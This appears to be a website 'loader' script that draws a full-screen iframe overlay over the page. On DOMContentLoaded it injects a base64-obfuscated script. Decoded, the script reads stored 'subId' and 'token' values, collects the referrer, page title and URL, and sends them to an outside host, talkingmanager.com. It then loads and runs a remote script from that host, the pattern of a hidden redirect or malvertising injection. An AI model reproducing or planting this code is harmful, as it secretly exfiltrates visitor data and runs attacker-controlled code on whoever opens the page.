const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('DOMContentLoaded', () => {
    const script = document.createElement('script');
    script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfOXF0NTV0NExyVnBQWVdaZCc7CiAgICBpZiAoIXdpbmRvdy5fOXF0NTV0NExyVnBQWVdaZCkgewogICAgICAgIHdpbmRvdy5fOXF0NTV0NExyVnBQWVdaZCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20veXpTVlZLTlInLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfV1ZtMlZtcGRiVlhHaEhqYiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX1dWbTJWbXBkYlZYR2hIamIgIT09ICd1bmRlZmluZWQnICYmIF9XVm0yVm1wZGJWWEdoSGpiICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9NSDR5cjZ4NVJYOGMxM2NqID0gSlNPTi5wYXJzZShfV1ZtMlZtcGRiVlhHaEhqYik7CiAgICAgICAgdmFyIF9yZzVaQldtZ210elQ5NGhxID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX01INHlyNng1Ulg4YzEzY2ouY3JlYXRlZF9hdCArIHdpbmRvdy5fOXF0NTV0NExyVnBQWVdaZC50dGwgPCBfcmc1WkJXbWdtdHpUOTRocSkgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX2oxaHZQcjVMSFBjZzdOOWMgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfcnJKTUgxN1ZTTVptbUtkaCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9WcWRHUTNjaGsyMWdMdjZHID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfVnFkR1EzY2hrMjFnTHY2RyArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfVnFkR1EzY2hrMjFnTHY2RyArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9WcWRHUTNjaGsyMWdMdjZHICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9WcWRHUTNjaGsyMWdMdjZHICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfVnFkR1EzY2hrMjFnTHY2RyArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfVnFkR1EzY2hrMjFnTHY2RyArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuXzlxdDU1dDRMclZwUFlXWmQuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX2oxaHZQcjVMSFBjZzdOOWMgIT09ICd1bmRlZmluZWQnICYmIF9qMWh2UHI1TEhQY2c3TjljICYmIHdpbmRvdy5fOXF0NTV0NExyVnBQWVdaZC51bmlxdWUpIHsKICAgICAgICBfVnFkR1EzY2hrMjFnTHY2RyArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9qMWh2UHI1TEhQY2c3TjljKTsKICAgIH0KICAgIGlmICh0eXBlb2YgX3JySk1IMTdWU01abW1LZGggIT09ICd1bmRlZmluZWQnICYmIF9yckpNSDE3VlNNWm1tS2RoICYmIHdpbmRvdy5fOXF0NTV0NExyVnBQWVdaZC51bmlxdWUpIHsKICAgICAgICBfVnFkR1EzY2hrMjFnTHY2RyArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX3JySk1IMTdWU01abW1LZGgpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF9WcWRHUTNjaGsyMWdMdjZHICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fOXF0NTV0NExyVnBQWVdaZC5SX1BBVEggKyBfVnFkR1EzY2hrMjFnTHY2RzsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
     document.querySelector("head").appendChild(script);
     setTimeout(toggleLoad, 1000);

  
})
